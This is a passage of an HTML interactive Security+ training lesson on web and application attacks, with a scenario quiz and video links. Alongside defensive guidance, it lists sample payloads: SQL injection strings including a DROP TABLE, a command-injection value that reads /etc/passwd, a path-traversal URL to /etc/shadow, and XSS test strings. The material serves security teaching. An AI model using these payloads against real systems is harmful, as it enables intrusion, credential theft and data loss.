    <p>SQL injection inserts (injects) malicious SQL code into input fields that are incorporated into database queries. When the application passes unsanitized input directly to the database, the injected SQL alters the intended query — potentially revealing all data in the database, bypassing authentication, or deleting records.</p>

    <div class="resp-table-wrap">
      <table class="resp-table" aria-label="SQL injection types and payloads">
        <thead>
          <tr>
            <th>Type</th>
            <th>Payload Example</th>
            <th>Effect</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>Authentication Bypass</td>
            <td><code>' OR '1'='1' --</code></td>
            <td>Login without valid credentials; always-true condition</td>
          </tr>
          <tr>
            <td>Union-Based Extraction</td>
            <td><code>' UNION SELECT username,password FROM users--</code></td>
            <td>Extract data from other tables in the database</td>
          </tr>
          <tr>
            <td>Blind SQLi (Boolean)</td>
            <td><code>' AND 1=1 --</code> vs <code>' AND 1=2 --</code></td>
            <td>Infer data by observing true/false response differences</td>
          </tr>
          <tr>
            <td>Time-Based Blind</td>
            <td><code>'; WAITFOR DELAY '0:0:5'--</code></td>
            <td>Infer data by measuring response delays</td>
          </tr>
          <tr>
            <td>Stacked Queries</td>
            <td><code>'; DROP TABLE users; --</code></td>
            <td>Execute multiple statements; destructive operations</td>
          </tr>
        </tbody>
      </table>
    </div>

    <div class="highlight-card">
      <span class="card-label">SQL Injection Defenses</span>
      <ul>
        <li><strong>Parameterized Queries / Prepared Statements:</strong> The ONLY reliable defense — SQL structure is defined before user input is added; input is always treated as data, never as SQL code</li>
        <li><strong>Stored Procedures:</strong> Pre-compiled SQL; user input passed as parameters</li>
        <li><strong>Input Validation:</strong> Reject unexpected characters; use allowlists</li>
        <li><strong>Least Privilege:</strong> Database user for the application should have minimal permissions (no DROP/ALTER rights)</li>
        <li><strong>WAF:</strong> Detect and block common SQL injection patterns</li>
      </ul>
    </div>

    <!-- Other Injection Types -->
    <h3>Other Injection &amp; Injection-Like Attacks</h3>
    <div class="accordion" id="otherAttacks">
      <div class="accordion-item">
        <button class="accordion-header" aria-expanded="false">
          Command Injection <span class="acc-icon">&#9660;</span>
        </button>
        <div class="accordion-body">
          <p>Command injection occurs when user input is passed to a system shell command without sanitization. An attacker can append shell operators (<code>;</code>, <code>&&</code>, <code>|</code>) to execute arbitrary operating system commands with the web server's privileges.</p>
          <p><strong>Vulnerable code:</strong> <code>ping $userInput</code> — if userInput is <code>127.0.0.1; cat /etc/passwd</code>, the server reveals the password file.</p>
          <p><strong>Defense:</strong> Never pass user input directly to shell commands. Use language-specific APIs instead of shell execution. Validate and allowlist all inputs.</p>
        </div>
      </div>
      <div class="accordion-item">
        <button class="accordion-header" aria-expanded="false">
          Directory Traversal (Path Traversal) <span class="acc-icon">&#9660;</span>
        </button>
        <div class="accordion-body">
          <p>Directory traversal exploits insufficient security validation of file paths. Attackers use <code>../</code> sequences to navigate outside the web root directory and access sensitive files on the server, such as <code>/etc/passwd</code>, configuration files, or private keys.</p>
          <p><strong>Example:</strong> <code>https://site.com/download?file=../../../../etc/shadow</code></p>
          <p><strong>Defense:</strong> Canonicalize file paths and validate they remain within the expected directory; use a whitelist of allowed file names; avoid passing user input directly to file system calls.</p>
        </div>
      </div>
      <div class="accordion-item">
        <button class="accordion-header" aria-expanded="false">
          API Attacks &amp; Broken Object Level Authorization (BOLA) <span class="acc-icon">&#9660;</span>
        </button>
        <div class="accordion-body">
          <p>APIs are increasingly targeted because they often expose the same data and functions as web applications but with less security maturity. <strong>BOLA (IDOR)</strong> — the #1 OWASP API Security risk — occurs when an API uses user-supplied identifiers to access objects without verifying the requesting user is authorized for that specific object.</p>
          <p><strong>Example:</strong> <code>GET /api/orders/12345</code> — changing the order ID reveals another user's order.</p>
          <p><strong>Defense:</strong> Enforce authorization checks at the object level for every API request; use indirect references; implement proper access control that ties user identity to object access.</p>
        </div>
      </div>
      <div class="accordion-item">
        <button class="accordion-header" aria-expanded="false">
          XML External Entity (XXE) &amp; SSRF <span class="acc-icon">&#9660;</span>
        </button>
        <div class="accordion-body">
          <p><strong>XXE:</strong> When an application parses XML input containing references to external entities, an attacker can read local files, perform SSRF, or cause denial of service. Disable external entity processing in XML parsers.</p>
          <p><strong>Server-Side Request Forgery (SSRF):</strong> The attacker causes the server to make HTTP requests to internal services that are not directly accessible from the internet — potentially reaching internal APIs, metadata endpoints (e.g., AWS instance metadata), or cloud storage. Increasingly important in cloud environments.</p>
        </div>
      </div>
    </div>

    <div style="margin-top:24px; text-align:right;">
      <button class="btn btn-primary" onclick="goToSection(5)">Next: Hijacking &amp; Overflow &#8594;</button>
    </div>
  </div>
</section>

<!-- ============================================================ -->
<!-- SECTION 5: HIJACKING & OVERFLOW -->
<!-- ============================================================ -->
<section class="lesson-section" id="section-5" aria-label="Hijacking and Overflow Attacks">
  <div class="section-header">
    <h2>Hijacking &amp; Overflow Attacks</h2>
    <span class="obj-tag">Session Hijacking &bull; Clickjacking &bull; Buffer Overflow &bull; Advertising Attacks</span>
  </div>
  <div class="section-body">

    <h3>Session Hijacking</h3>
    <p>After a user authenticates to a web application, the server assigns a <strong>session token</strong> (typically stored in a cookie) to identify subsequent requests from that user. Session hijacking occurs when an attacker obtains and uses a valid session token to impersonate the authenticated user without knowing their credentials.</p>

    <div class="card-grid">
      <div class="info-card danger-card">
        <h4>Token Theft via XSS</h4>
        <p>The most common method — a stored or reflected XSS vulnerability allows malicious JavaScript to read <code>document.cookie</code> and exfiltrate the session token to an attacker-controlled server.</p>
      </div>
      <div class="info-card danger-card">
        <h4>Network Sniffing</h4>
        <p>On unencrypted (HTTP) connections or networks where an attacker can perform MITM, session cookies transmitted in plaintext can be captured directly from network traffic.</p>
      </div>
      <div class="info-card warning-card">
        <h4>Session Token Prediction</h4>
        <p>Poorly implemented session token generators that use predictable values (timestamps, sequential IDs) allow attackers to guess valid tokens without interception.</p>
      </div>
      <div class="info-card">
        <h4>Defenses</h4>
        <p>Use HTTPS always; set <code>HttpOnly</code> and <code>Secure</code> cookie flags; implement short session timeouts; regenerate session IDs after login; validate IP/User-Agent consistency.</p>
      </div>
    </div>

    <h3>URL Hijacking &amp; Domain Hijacking</h3>
    <div class="resp-table-wrap">
      <table class="resp-table" aria-label="URL and domain hijacking comparison">
        <thead>
          <tr>
            <th>Attack Type</th>
            <th>Mechanism</th>
            <th>Goal</th>
            <th>Example</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>URL Hijacking (Typosquatting)</strong></td>
            <td>Register domain names that are common misspellings of legitimate sites</td>
            <td>Ad revenue, credential theft, malware distribution</td>
            <td><code>goggle.com</code>, <code>amazon.cm</code></td>
          </tr>
          <tr>
            <td><strong>Domain Hijacking</strong></td>
            <td>Compromise domain registrar account to redirect DNS pointer to attacker server</td>
            <td>Full interception of all traffic to the domain</td>
            <td>Attacker changes A/NS records at the registrar</td>
          </tr>
          <tr>
            <td><strong>Clickjacking (UI Redressing)</strong></td>
            <td>Invisible or transparent iframe overlaid on a visible web page</td>
            <td>Trick user into clicking attacker's hidden button/link</td>
            <td>Invisible "Like" button over a malicious link</td>
          </tr>
        </tbody>
      </table>
    </div>

    <div class="highlight-card">
      <span class="card-label">Clickjacking Defense: X-Frame-Options &amp; CSP</span>
      <p>The <code>X-Frame-Options: DENY</code> or <code>X-Frame-Options: SAMEORIGIN</code> HTTP response header prevents a page from being embedded in an iframe by another site. The modern equivalent is the <code>Content-Security-Policy: frame-ancestors 'none'</code> directive, which provides more granular control over which sites can frame the content.</p>
    </div>

    <!-- Buffer Overflow -->
    <h3>Buffer Overflow Attacks</h3>
    <p>A buffer overflow occurs when a program writes more data to a fixed-length memory buffer than it can hold. The excess data overwrites adjacent memory, potentially corrupting program state, crashing the application, or — in a carefully crafted exploit — overwriting the return address on the stack to redirect program execution to attacker-supplied shellcode.</p>

    <div class="attack-flow" role="img" aria-label="Buffer overflow diagram">
      <h4>&#9888; Buffer Overflow Memory Layout</h4>
      <div style="display:flex; gap:8px; align-items:stretch; flex-wrap:wrap; font-family:var(--font-mono); font-size:.8rem;">
        <div style="flex:1; min-width:100px; background:rgba(0,102,102,.5); border:2px solid var(--teal); padding:12px; border-radius:6px; text-align:center;">
          <div style="color:var(--gold); font-weight:700; margin-bottom:6px;">Normal</div>
          <div>[ Buffer ]</div>
          <div>[ Stack Frame ]</div>
          <div>[ Return Addr ]</div>
          <div style="color:#66ff66; margin-top:4px;">&#9745; Safe</div>
        </div>
        <div style="display:flex; align-items:center; font-size:1.4rem; color:var(--gold);">&#8594;</div>
        <div style="flex:1; min-width:100px; background:rgba(204,0,0,.4); border:2px solid var(--danger); padding:12px; border-radius:6px; text-align:center;">
          <div style="color:var(--danger-light); font-weight:700; margin-bottom:6px;">Overflow</div>
          <div style="color:#ff6666;">[ AAAAAAAAAAAAAAAA ]</div>
          <div style="color:#ff6666;">[ AAAAAAAAAAAAAAAA ]</div>
          <div style="color:var(--danger-light);">[ &lt;shellcode addr&gt; ]</div>
          <div style="color:var(--danger-light); margin-top:4px;">&#9746; Exploited</div>
        </div>
        <div style="display:flex; align-items:center; font-size:1.4rem; color:var(--gold);">&#8594;</div>
        <div style="flex:1; min-width:100px; background:rgba(102,0,0,.5); border:2px solid #660000; padding:12px; border-radius:6px; text-align:center;">
          <div style="color:var(--danger-light); font-weight:700; margin-bottom:6px;">Code Execution</div>
          <div>Attacker's code</div>
          <div>runs with the</div>
          <div>process's privileges</div>
          <div style="color:var(--danger-light); margin-top:4px;">&#128165; RCE</div>
        </div>
      </div>
    </div>

    <div class="card-grid">
      <div class="info-card danger-card">
        <h4>Stack Buffer Overflow</h4>
        <p>Overwrites the stack frame including the return address, redirecting execution to attacker-controlled code (shellcode). The classic buffer overflow exploit technique.</p>
      </div>
      <div class="info-card warning-card">
        <h4>Heap Buffer Overflow</h4>
        <p>Overflows heap-allocated buffers, corrupting heap metadata or adjacent heap objects. Exploited through techniques like use-after-free or heap spray. More complex than stack overflows.</p>
      </div>
      <div class="info-card warning-card">
        <h4>Integer Overflow</h4>
        <p>An arithmetic operation produces a value outside the range a variable can hold. In security-critical code (e.g., size calculations), this can cause incorrect memory allocation and lead to buffer overflows.</p>
      </div>
    </div>

    <div class="highlight-card">
      <span class="card-label">Buffer Overflow Countermeasures</span>
      <ul>
        <li><strong>ASLR (Address Space Layout Randomization):</strong> Randomizes memory addresses at runtime, making it difficult to predict where shellcode is placed</li>
        <li><strong>DEP/NX (Data Execution Prevention / No-Execute):</strong> Marks memory regions as non-executable, preventing code execution from the stack or heap</li>
        <li><strong>Stack Canaries:</strong> Place a known value before the return address; if overwritten, the program terminates rather than executing attacker code</li>
        <li><strong>Safe String Functions:</strong> Use bounded functions (<code>strncpy</code>, <code>snprintf</code>) instead of unbounded (<code>strcpy</code>, <code>sprintf</code>)</li>
        <li><strong>Memory-Safe Languages:</strong> Rust, Go, and modern C++ practices eliminate entire classes of memory safety vulnerabilities</li>
      </ul>
    </div>

    <!-- Malvertising -->
    <h3>Advertising Attacks: Malvertising &amp; Ad Fraud</h3>
    <p><strong>Malvertising</strong> uses legitimate online advertising networks to distribute malware. Attackers purchase ad space on reputable networks and serve ads that contain malicious code — which may execute via browser exploits even without the user clicking. Because ad networks rotate content rapidly and serve across thousands of websites, malvertising is extremely difficult to detect and can affect even premium, high-traffic websites.</p>

    <div class="danger-highlight">
      <span class="card-label">Why Malvertising Is Effective</span>
      <ul>
        <li>Attacks originate from major, trusted ad networks — victims do not click suspicious links</li>
        <li>Drive-by downloads execute via browser or plug-in vulnerabilities without user interaction</li>
        <li>Attackers can narrowly target victims by geography, browser type, or OS</li>
        <li>Website owners have no direct control over ad network content</li>
        <li>Rapid ad rotation makes attribution and takedown difficult</li>
      </ul>
    </div>

    <h3>Browser Extension &amp; Plug-in Vulnerabilities</h3>
    <p>Browser extensions and plug-ins expand browser functionality but introduce significant attack surface. Malicious or compromised extensions can access and modify all web content, steal credentials, modify HTTP requests, and spy on browsing activity. The deprecation of NPAPI plug-ins (Java, Flash) has reduced one major attack surface, but extensions remain a concern.</p>

    <div class="resp-table-wrap">
      <table class="resp-table" aria-label="Browser add-on security comparison">
        <thead>
          <tr>
            <th>Type</th>
            <th>Access Level</th>
            <th>Security Risk</th>
            <th>Mitigation</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td>Browser Extensions</td>
            <td>Can read/modify all page content, intercept requests</td>
            <td>High — can steal credentials, inject code</td>
            <td>Install from verified stores only; review permissions; disable unused</td>
          </tr>
          <tr>
            <td>Legacy Plug-ins (Java, Flash)</td>
            <td>Native code execution</td>
            <td>Critical — arbitrary code execution</td>
            <td>No longer supported; block or remove entirely</td>
          </tr>
          <tr>
            <td>JavaScript (Built-in)</td>
            <td>DOM manipulation, network requests</td>
            <td>Medium — basis for most XSS attacks</td>
            <td>Content Security Policy, NoScript, browser sandboxing</td>
          </tr>
        </tbody>
      </table>
    </div>

    <div style="margin-top:24px; text-align:right;">
      <button class="btn btn-primary" onclick="goToSection(6)">Next: Interactive Lab &#8594;</button>
    </div>
  </div>
</section>

<!-- ============================================================ -->
<!-- SECTION 6: INTERACTIVE LAB -->
<!-- ============================================================ -->
<section class="lesson-section" id="section-6" aria-label="Interactive Lab">
  <div class="section-header">
    <h2>Interactive Lab</h2>
    <span class="obj-tag">Hands-On Learning Simulations</span>
  </div>
  <div class="section-body">
    <p>These simulations demonstrate attack techniques in a safe, sandboxed environment. No actual attacks are performed — these are educational models of how the attacks work.</p>

    <!-- SQL Injection Simulator -->
    <h3>&#128272; SQL Injection Simulator</h3>
    <p>This simulator shows how SQL injection works by demonstrating what queries look like with and without malicious input. Enter different values to see how the SQL query changes.</p>

    <div class="sql-sim" role="region" aria-label="SQL injection simulator">
      <h4>&#9888; SQL Injection Demonstration (Educational Only)</h4>
      <p style="font-size:.82rem; opacity:.8; margin-bottom:16px;">Simulated login form. The vulnerable application constructs this SQL query:</p>
      <div style="font-family:var(--font-mono); font-size:.82rem; background:#0d1b2a; padding:12px 16px; border-radius:6px; margin-bottom:16px; color:#aaa;">
        SELECT * FROM users WHERE username = '<span style="color:#66ccff;">INPUT</span>' AND password = '<span style="color:#66ccff;">INPUT</span>'
      </div>
      <div class="sql-input-wrap">
        <div style="flex:1; min-width:200px;">
          <label for="sqlUsername" style="font-size:.82rem; display:block; margin-bottom:4px; color:var(--gold);">Username:</label>
          <input type="text" id="sqlUsername" value="admin" placeholder="Enter username" aria-label="SQL injection username input">
        </div>
        <div style="flex:1; min-width:200px;">
          <label for="sqlPassword" style="font-size:.82rem; display:block; margin-bottom:4px; color:var(--gold);">Password:</label>
          <input type="text" id="sqlPassword" value="password123" placeholder="Enter password" aria-label="SQL injection password input">
        </div>
      </div>
      <div style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:16px;">
        <button class="btn btn-primary" onclick="runSqlSim()">Run Query</button>
        <button class="btn" style="background:rgba(204,0,0,.8); color:white;" onclick="injectSqlBypass()">&#9888; Inject Auth Bypass</button>
        <button class="btn" style="background:rgba(204,0,0,.8); color:white;" onclick="injectSqlUnion()">&#9888; Inject UNION Attack</button>
        <button class="btn btn-outline" onclick="resetSqlSim()">Reset</button>
      </div>
      <p style="font-size:.8rem; color:var(--gold); margin-bottom:8px;">Generated SQL Query:</p>
      <div class="sql-query-display" id="sqlQueryDisplay" aria-live="polite">Click "Run Query" to see the generated SQL statement.</div>
      <p style="font-size:.8rem; color:var(--gold); margin-bottom:8px; margin-top:12px;">Server Response:</p>
      <div class="sql-result-display" id="sqlResultDisplay" aria-live="polite">Awaiting query...</div>
    </div>

    <!-- XSS Sandbox -->
    <h3>&#128187; XSS Input Validation Sandbox</h3>
    <p>This sandbox demonstrates the difference between safe and unsafe rendering of user input. Compare how a vulnerable application vs. a secured application handles potentially malicious input.</p>

    <div class="xss-sandbox" role="region" aria-label="XSS input validation sandbox">
      <h4>XSS Demonstration (Safe Environment)</h4>
      <div class="demo-row">
        <div class="demo-field">
          <label for="xssInput">Enter text (try: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> or <code>&lt;img src=x onerror=alert(1)&gt;</code>):</label>
          <input type="text" id="xssInput" value="Hello &lt;World&gt;!" aria-describedby="xss-note">
        </div>
      </div>
      <div style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:16px;">
        <button class="btn btn-danger" onclick="renderXssUnsafe()">&#9888; Render (Vulnerable — Simulated)</button>
        <button class="btn btn-primary" onclick="renderXssSafe()">&#9989; Render (Secured)</button>
        <button class="btn btn-outline" onclick="document.getElementById('xssInput').value=''; document.getElementById('xssUnsafeOut').textContent=''; document.getElementById('xssSafeOut').textContent='';">Clear</button>
      </div>
      <p id="xss-note" class="sr-only">This sandbox safely demonstrates XSS concepts. No actual scripts will execute.</p>
      <div style="display:grid; grid-template-columns:1fr 1fr; gap:16px; flex-wrap:wrap;">
        <div>
          <p style="font-weight:700; color:var(--danger); font-size:.85rem; margin-bottom:6px;">&#9888; Vulnerable (innerText shows what innerHTML would do):</p>
          <div class="xss-preview" id="xssUnsafeOut" aria-live="polite"></div>
        </div>
        <div>
          <p style="font-weight:700; color:var(--green-ok); font-size:.85rem; margin-bottom:6px;">&#9989; Secured (HTML-encoded output):</p>
          <div class="xss-preview" id="xssSafeOut" aria-live="polite"></div>
        </div>
      </div>
    </div>

    <!-- Attack Identification Challenge -->
    <h3>&#127919; Attack Identification Challenge</h3>
    <p>Read each scenario and identify the attack type. Click to reveal the answer and explanation.</p>

    <div class="accordion" id="attackChallenges">
      <div class="accordion-item">
        <button class="accordion-header" aria-expanded="false">
          Scenario 1: A security analyst notices that the server's ARP table shows the gateway's IP address mapped to an unexpected MAC address that does not match the gateway's actual MAC. <span class="acc-icon">&#9660;</span>
        </button>
        <div class="accordion-body">
          <p><strong>Attack: ARP Poisoning / ARP Spoofing</strong></p>
          <p>The unexpected MAC address mapping in the ARP table is the hallmark indicator of ARP poisoning. An attacker has broadcasted fake ARP replies to associate their device's MAC address with the gateway's IP, redirecting all traffic through the attacker. Detection through ARP table monitoring and Dynamic ARP Inspection (DAI) are key defenses.</p>
        </div>
      </div>
      <div class="accordion-item">
        <button class="accordion-header" aria-expanded="false">
          Scenario 2: A developer's web application returns a database error when a user enters a single quote character in a search field. <span class="acc-icon">&#9660;</span>
        </button>
        <div class="accordion-body">
          <p><strong>Attack Vector: SQL Injection vulnerability detected</strong></p>
          <p>A database error triggered by a single quote (<code>'</code>) is a classic indicator that user input is being directly concatenated into a SQL query without sanitization. The quote character breaks the SQL string literal, causing a syntax error. This confirms the application is vulnerable to SQL injection. The fix is parameterized queries/prepared statements.</p>
        </div>
      </div>
      <div class="accordion-item">
        <button class="accordion-header" aria-expanded="false">
          Scenario 3: A user clicks a link in an email, visits a page that looks normal, then discovers their bank account made a $2,000 transfer they did not initiate. The user was logged into their bank in another tab. <span class="acc-icon">&#9660;</span>
        </button>
        <div class="accordion-body">
          <p><strong>Attack: Cross-Site Request Forgery (CSRF / XSRF)</strong></p>
          <p>The attacker's page made an unauthorized request to the bank on behalf of the authenticated user. The bank's session cookie was automatically included by the browser, making the request appear legitimate. The user did not need to take any action on the malicious page — simply visiting it with an active bank session was sufficient. SameSite cookie attributes and CSRF tokens prevent this attack.</p>
        </div>
      </div>
      <div class="accordion-item">
        <button class="accordion-header" aria-expanded="false">
          Scenario 4: A web application's server logs show thousands of HTTP GET requests per second from many different IP addresses, all requesting the same computationally expensive search function. <span class="acc-icon">&#9660;</span>
        </button>
        <div class="accordion-body">
          <p><strong>Attack: Application-Layer DDoS (HTTP Flood)</strong></p>
          <p>This is a Layer 7 (application-layer) DDoS attack specifically targeting a resource-intensive function. Unlike volumetric attacks that simply flood bandwidth, this attack targets the application's processing capacity. Because each request may look legitimate, rate limiting by IP alone may be insufficient. A Web Application Firewall (WAF), CAPTCHA challenges, and CDN-based bot detection are appropriate countermeasures.</p>
        </div>
      </div>
      <div class="accordion-item">
        <button class="accordion-header" aria-expanded="false">
          Scenario 5: After visiting a popular news website (not clicking any ads), a user's computer is infected with ransomware. The website itself had not been directly compromised. <span class="acc-icon">&#9660;</span>
        </button>
        <div class="accordion-body">
          <p><strong>Attack: Malvertising (Drive-by Download via Ad Network)</strong></p>
          <p>The user was infected through a malicious advertisement served by the news website's ad network — not the website itself. The ad contained code that exploited a browser or plug-in vulnerability to install ransomware without requiring any user interaction beyond loading the page. This is why keeping browsers and plug-ins patched is critical even when visiting legitimate websites. Blocking ad networks or using a browser that isolates ad content reduces this risk.</p>
        </div>
      </div>
    </div>

    <div style="margin-top:24px; text-align:right;">
      <button class="btn btn-primary" onclick="goToSection(7)">Next: Flashcards &#8594;</button>
    </div>
  </div>
</section>

<!-- ============================================================ -->
<!-- SECTION 7: FLASHCARDS -->
<!-- ============================================================ -->
<section class="lesson-section" id="section-7" aria-label="Flashcards">
  <div class="section-header">
    <h2>Flashcards: Key Terms &amp; Concepts</h2>
    <span class="obj-tag">Review &bull; Click Card to Flip</span>
  </div>
  <div class="section-body">
    <p>Click a flashcard to reveal its definition. Use the navigation buttons to move through the deck. Keyboard shortcut: Press <kbd>Space</kbd> or <kbd>Enter</kbd> to flip; arrow keys to navigate.</p>

    <div class="flashcard-deck">
      <div class="flashcard" id="flashcard" role="button" aria-label="Flashcard — click to flip" tabindex="0" onclick="flipCard()" onkeydown="if(event.key==='Enter'||event.key===' '){event.preventDefault();flipCard();}">
        <div class="flashcard-inner">
          <div class="flashcard-face flashcard-front">
            <div class="fc-label">Term</div>
            <div id="fcTerm">Loading...</div>
          </div>
          <div class="flashcard-face flashcard-back">
            <div id="fcDef">Loading...</div>
          </div>
        </div>
      </div>
      <div class="fc-controls">
        <button class="btn btn-navy" onclick="prevCard()" aria-label="Previous flashcard">&#8592; Prev</button>
        <span class="fc-counter" id="fcCounter" aria-live="polite">1 / 20</span>
        <button class="btn btn-navy" onclick="nextCard()" aria-label="Next flashcard">Next &#8594;</button>
      </div>
      <button class="btn btn-outline" onclick="shuffleCards()" aria-label="Shuffle flashcard deck">&#128256; Shuffle Deck</button>
    </div>

    <div style="margin-top:24px; text-align:right;">
      <button class="btn btn-primary" onclick="goToSection(8)">Next: Knowledge Check &#8594;</button>
    </div>
  </div>
</section>

<!-- ============================================================ -->
<!-- SECTION 8: KNOWLEDGE CHECK / QUIZ -->
<!-- ============================================================ -->
<section class="lesson-section" id="section-8" aria-label="Knowledge Check Quiz">
  <div class="section-header">
    <h2>Knowledge Check</h2>
    <span class="obj-tag">Security+ Style Questions &bull; 12 Questions</span>
  </div>
  <div class="section-body">
    <p>Test your understanding with these Security+ style scenario-based questions. Choose the best answer for each question, then click <strong>Submit Quiz</strong> to see your score and explanations.</p>

    <div class="quiz-container" id="quizContainer" role="form" aria-label="Knowledge check questions">
      <!-- Questions generated by JavaScript -->
    </div>

    <div style="display:flex; gap:12px; flex-wrap:wrap; margin-top:8px;">
      <button class="btn btn-danger" id="submitQuizBtn" onclick="submitQuiz()">&#9989; Submit Quiz</button>
      <button class="btn btn-outline" id="resetQuizBtn" onclick="resetQuiz()" style="display:none;">&#8635; Reset Quiz</button>
    </div>

    <div class="quiz-score" id="quizScore" role="status" aria-live="polite">
      <div class="score-num" id="scoreNum"></div>
      <div class="score-label" id="scoreLabel"></div>
    </div>

    <div style="margin-top:24px; text-align:right;">
      <button class="btn btn-primary" onclick="goToSection(9)">Next: Resources &#8594;</button>
    </div>
  </div>
</section>

<!-- ============================================================ -->
<!-- SECTION 9: RESOURCES -->
<!-- ============================================================ -->
<section class="lesson-section" id="section-9" aria-label="Additional Resources">
  <div class="section-header">
    <h2>Additional Resources &amp; Videos</h2>
    <span class="obj-tag">Video Lessons &bull; References &bull; Practice</span>
  </div>
  <div class="section-body">

    <h3>&#127909; Embedded Video Lessons</h3>
    <p>These curated videos provide additional explanations and demonstrations of key attack concepts covered in this lesson.</p>

    <div class="yt-section-label">
      <span class="yt-icon">&#9654;</span>
      <span>Video content — click thumbnails to play inline (requires internet connection)</span>
    </div>

    <div class="yt-embed-grid" id="videoGrid">

      <!-- Video 1: On-Path Attacks (Professor Messer SY0-701 2.4) -->
      <div class="yt-embed-card">
        <div class="yt-embed-wrap">
          <button class="yt-facade"
            id="facade-v1"
            style="background-image:url('https://img.youtube.com/vi/M_Af6_8JTuo/hqdefault.jpg');"
            onclick="loadYT('yt-v1','M_Af6_8JTuo',this)"
            aria-label="Play: On-Path Attacks — CompTIA Security+ SY0-701 by Professor Messer">
            <div class="yt-ext-badge" id="ext-badge-v1" style="display:none;">Opens on YouTube</div>
            <div class="yt-play-btn" aria-hidden="true">
              <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
            </div>
            <div class="yt-duration">~9 min</div>
          </button>
          <div id="yt-v1" style="display:none; position:absolute; top:0; left:0; width:100%; height:100%;"></div>
        </div>
        <div class="yt-embed-info">
          <h4>On-Path Attacks — Security+ SY0-701</h4>
          <p>ARP poisoning, MITM interception, and on-path attack techniques explained for the Security+ exam.</p>
          <span class="yt-channel">Professor Messer</span>
        </div>
      </div>

      <!-- Video 2: DDoS Attacks -->
      <div class="yt-embed-card">
        <div class="yt-embed-wrap">
          <button class="yt-facade"
            id="facade-v2"
            style="background-image:url('https://img.youtube.com/vi/ilhGh9CEIwM/hqdefault.jpg');"
            onclick="loadYT('yt-v2','ilhGh9CEIwM',this)"
            aria-label="Play: DDoS Attacks Explained">
            <div class="yt-ext-badge" id="ext-badge-v2" style="display:none;">Opens on YouTube</div>
            <div class="yt-play-btn" aria-hidden="true">
              <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
            </div>
            <div class="yt-duration">~8 min</div>
          </button>
          <div id="yt-v2" style="display:none; position:absolute; top:0; left:0; width:100%; height:100%;"></div>
        </div>
        <div class="yt-embed-info">
          <h4>DDoS Attacks Explained</h4>
          <p>How distributed denial of service attacks work, including volumetric, protocol, and application-layer variants.</p>
          <span class="yt-channel">IBM Technology</span>
        </div>
      </div>

      <!-- Video 3: SQL Injection -->
      <div class="yt-embed-card">
        <div class="yt-embed-wrap">
          <button class="yt-facade"
            id="facade-v3"
            style="background-image:url('https://img.youtube.com/vi/ciNHn38EyRc/hqdefault.jpg');"
            onclick="loadYT('yt-v3','ciNHn38EyRc',this)"
            aria-label="Play: SQL Injection Tutorial">
            <div class="yt-ext-badge" id="ext-badge-v3" style="display:none;">Opens on YouTube</div>
            <div class="yt-play-btn" aria-hidden="true">
              <svg viewBox="0 0 24 24"><path d="M8 5 v14l11-7z"/></svg>
            </div>
            <div class="yt-duration">~14 min</div>
          </button>
          <div id="yt-v3" style="display:none; position:absolute; top:0; left:0; width:100%; height:100%;"></div>
        </div>
        <div class="yt-embed-info">
          <h4>SQL Injection — Full Tutorial</h4>
          <p>Comprehensive walkthrough of SQL injection attack types, payloads, and how to prevent them with parameterized queries.</p>
          <span class="yt-channel">Web Dev Simplified</span>
        </div>
      </div>

      <!-- Video 4: XSS (Professor Messer SY0-701 2.3) -->
      <div class="yt-embed-card">
        <div class="yt-embed-wrap">
          <button class="yt-facade"
            id="facade-v4"
            style="background-image:url('https://img.youtube.com/vi/PKgw0CLZIhE/hqdefault.jpg');"
            onclick="loadYT('yt-v4','PKgw0CLZIhE',this)"
            aria-label="Play: Cross-Site Scripting (XSS) — CompTIA Security+ SY0-701 by Professor Messer">
            <div class="yt-ext-badge" id="ext-badge-v4" style="display:none;">Opens on YouTube</div>
            <div class="yt-play-btn" aria-hidden="true">
              <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
            </div>
            <div class="yt-duration">~10 min</div>
          </button>
          <div id="yt-v4" style="display:none; position:absolute; top:0; left:0; width:100%; height:100%;"></div>
        </div>
        <div class="yt-embed-info">
          <h4>Cross-Site Scripting (XSS) — Security+ SY0-701</h4>
          <p>Reflected, stored, and persistent XSS attacks with real-world examples and defensive coding techniques.</p>
          <span class="yt-channel">Professor Messer</span>
        </div>
      </div>

      <!-- Video 5: Buffer Overflow -->
      <div class="yt-embed-card">
        <div class="yt-embed-wrap">
          <button class="yt-facade"
            id="facade-v5"
            style="background-image:url('https://img.youtube.com/vi/1S0aBV-Waeo/hqdefault.jpg');"
            onclick="loadYT('yt-v5','1S0aBV-Waeo',this)"
            aria-label="Play: Buffer Overflow Attack Explained">
            <div class="yt-ext-badge" id="ext-badge-v5" style="display:none;">Opens on YouTube</div>
            <div class="yt-play-btn" aria-hidden="true">
              <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
            </div>
            <div class="yt-duration">~18 min</div>
          </button>
          <div id="yt-v5" style="display:none; position:absolute; top:0; left:0; width:100%; height:100%;"></div>
        </div>
        <div class="yt-embed-info">
          <h4>Buffer Overflow Attacks — Explained</h4>
          <p>How buffer overflows work in memory, stack smashing, and modern mitigations (ASLR, DEP, stack canaries).</p>
          <span class="yt-channel">Computerphile</span>
        </div>
      </div>

      <!-- Video 6: CSRF -->
      <div class="yt-embed-card">
        <div class="yt-embed-wrap">
          <button class="yt-facade"
            id="facade-v6"
            style="background-image:url('https://img.youtube.com/vi/hW2ONyxAySY/hqdefault.jpg');"
            onclick="loadYT('yt-v6','hW2ONyxAySY',this)"
            aria-label="Play: CSRF Attack Explained">
            <div class="yt-ext-badge" id="ext-badge-v6" style="display:none;">Opens on YouTube</div>
            <div class="yt-play-btn" aria-hidden="true">
              <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
            </div>
            <div class="yt-duration">~10 min</div>
          </button>
          <div id="yt-v6" style="display:none; position:absolute; top:0; left:0; width:100%; height:100%;"></div>
        </div>
        <div class="yt-embed-info">
          <h4>CSRF Attacks &amp; Defenses</h4>
          <p>Cross-Site Request Forgery explained with practical examples, CSRF tokens, and SameSite cookie defenses.</p>
          <span class="yt-channel">Hussein Nasser</span>
        </div>
      </div>

    </div>

